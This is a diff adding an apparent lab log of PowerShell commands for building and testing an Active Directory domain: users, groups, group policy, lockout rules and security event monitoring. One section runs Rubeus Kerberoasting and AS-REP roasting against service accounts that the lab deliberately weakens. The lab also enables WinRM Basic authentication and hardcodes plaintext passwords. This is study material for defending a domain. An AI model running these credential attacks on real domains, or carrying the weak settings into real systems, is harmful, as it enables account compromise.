@@ -1,1 +1,156 @@
 
+# 💻 PowerShell Command Log – AD DS Security Lab
+
+This document logs all core PowerShell commands used during the Active Directory lab setup and security testing.
+
+---
+
+## 🏗️ DOMAIN SETUP
+```powershell
+Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
+Install-ADDSForest -DomainName "forest.local" -InstallDNS
+Get-ADDomainController | FL Name,Domain,Forest
+```
+
+---
+
+## 🗂️ OU STRUCTURE
+```powershell
+New-ADOrganizationalUnit -Name "GROUPS" -Path "DC=forest,DC=local"
+New-ADOrganizationalUnit -Name "INTERNS" -Path "DC=forest,DC=local"
+Get-ADOrganizationalUnit -Filter *
+```
+
+---
+
+## 👥 USER MANAGEMENT
+```powershell
+New-ADUser -Name "Ravi" -GivenName "Ravi" -Surname "Sharma" -SamAccountName "ravi" -Path "OU=MARKETING,OU=PUNE,OU=INDIA,DC=forest,DC=local" -AccountPassword (ConvertTo-SecureString "P@ssword10$" -AsPlainText -Force) -Enabled $true
+New-ADUser -Name "Adrien" -GivenName "Adrien" -Surname "Agreste" -SamAccountName "adrien" -Path "OU=DESIGN,OU=PARIS,OU=FRANCE,DC=forest,DC=local" -AccountPassword (ConvertTo-SecureString "P@ssword10$" -AsPlainText -Force) -Enabled $true
+
+Set-ADAccountPassword -Identity "adrien" -Reset -NewPassword (ConvertTo-SecureString "Test@1234" -AsPlainText -Force)
+Enable-ADAccount -Identity "adrien"
+
+Unlock-ADAccount -Identity "adrien"
+```
+
+---
+
+## 👨‍👩‍👧‍👦 GROUP MANAGEMENT
+```powershell
+New-ADGroup -Name "IT_Admins" -GroupScope Global -Path "OU=GROUPS,DC=forest,DC=local" -Description "Admin rights"
+New-ADGroup -Name "MFA_required" -GroupScope Universal -Path "OU=GROUPS,DC=forest,DC=local" -Description "MFA-enabled users"
+
+Add-ADGroupMember -Identity "IT_Admins" -Members "ravi", "yoojung"
+Add-ADGroupMember -Identity "MFA_required" -Members "adrien", "ravi"
+```
+
+---
+
+## 🔐 PERMISSION DELEGATION
+```powershell
+dsacls "OU=MARKETING,OU=PUNE,OU=INDIA,DC=forest,DC=local" /G "IT_Admins:CC;user" /I:S
+dsacls "OU=HR,OU=CHENNAI,OU=INDIA,DC=forest,DC=local" /G "HR_Junior:CA;Reset Password"
+dsacls "OU=HR,OU=CHENNAI,OU=INDIA,DC=forest,DC=local"
+```
+
+---
+
+## 🛡️ GROUP POLICY SETUP
+```powershell
+New-GPO -Name "Enforce_Strong_Passwords"
+Set-GPRegistryValue -Name "Enforce_Strong_Passwords" -Key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Network" -ValueName "MinPasswordLength" -Type DWord -Value 12
+New-GPLink -Name "Enforce_Strong_Passwords" -Target "DC=forest,DC=local"
+
+New-GPO -Name "Account_Lockout_3_Attempts"
+Set-GPRegistryValue -Name "Account_Lockout_3_Attempts" -Key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ValueName "LockoutBadCount" -Type DWord -Value 3
+
+gpupdate /force
+gpresult /r
+gpresult /h report.html
+```
+
+---
+
+## 📊 MONITORING & LOGGING
+```powershell
+Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4625)]]" -MaxEvents 10
+Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624)]]" -MaxEvents 10
+Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4688)]]" -MaxEvents 10
+Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4740)]]" -MaxEvents 5
+```
+
+---
+
+## 🧪 ATTACK SIMULATIONS
+
+### 🟠 Kerberoasting
+```powershell
+New-ADUser -Name "svcSQL" -SamAccountName "svcSQL" -AccountPassword (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force) -Enabled $true
+Set-ADUser svcSQL -ServicePrincipalNames @{Add="MSSQLSvc/dc.forest.local:1433"}
+.\Rubeus.exe kerberoast /user:svcSQL /rc4opsec
+```
+
+### 🟠 AS-REP Roasting 
+```powershell
+Set-ADAccountControl -Identity "svcWeb" -DoesNotRequirePreAuth $true
+.\Rubeus.exe asreproast
+```
+
+---
+
+## 🧪 Brute Force Attack & Account Lockout Simulation
+
+### 🔐 Account Lockout Policy Configuration (via GPO)
+```powershell
+New-GPO -Name "Account_Lockout_3_Attempts"
+Set-GPRegistryValue -Name "Account_Lockout_3_Attempts" -Key "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -ValueName "LockoutBadCount" -Type DWord -Value 3
+New-GPLink -Name "Account_Lockout_3_Attempts" -Target "DC=forest,DC=local"
+gpupdate /force
+
+# Simulate failed login via script — 
+$domain = "FOREST"
+$username = "adrien"
+$password = "WrongPassword1"
+
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("$domain\\$username", $securePassword)
+Start-Process cmd.exe -Credential $creds
+
+### 📊 Monitor Lockout & Failed Logins
+
+# Failed logins
+Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4625)]]" -MaxEvents 10
+
+# Account lockout events
+Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4740)]]" -MaxEvents 10
+
+# Successful logins
+Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624)]]" -MaxEvents 10
+
+---
+
+## 🛰️ REMOTE MANAGEMENT
+```powershell
+Enable-PSRemoting -Force
+Add-ADGroupMember -Identity "Remote Management Users" -Members "adrien", "ravi"
+winrm set winrm/config/service/auth '@{Basic="true"}'
+```
+
+---
+
+## 🛠️ TROUBLESHOOTING / OTHER
+```powershell
+Import-Module .\SharpHound.ps1  # (Failed due to .NET 3.5)
+Get-ADGroupMember -Identity "IT_Admins"
+Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled
+```
+
+---
+
+## 🧹 CLEANUP 
+```powershell
+Remove-ADUser -Identity "svcSQL"
+Remove-ADGroup -Identity "HR_Junior"
+```
+
